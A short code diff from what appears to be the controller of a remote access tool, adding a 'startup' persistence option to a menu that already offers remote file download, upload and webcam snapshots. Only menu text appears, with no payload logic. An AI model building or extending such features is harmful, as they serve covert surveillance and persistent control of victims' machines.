@@ -157,6 +157,7 @@ def start_listening():
     menu += bcolors.GREEN + "download <remote filename> <local filename>\n" + bcolors.ENDC
     menu += bcolors.GREEN + "upload <local filename> <remote filename>\n" + bcolors.ENDC
     menu += bcolors.GREEN + "webcam_snap <local filename>\n" + bcolors.ENDC
+    menu += bcolors.GREEN + "startup  (run the program when system startup)\n" + bcolors.ENDC
     menu += "========================================================\n"
     print(menu)
 
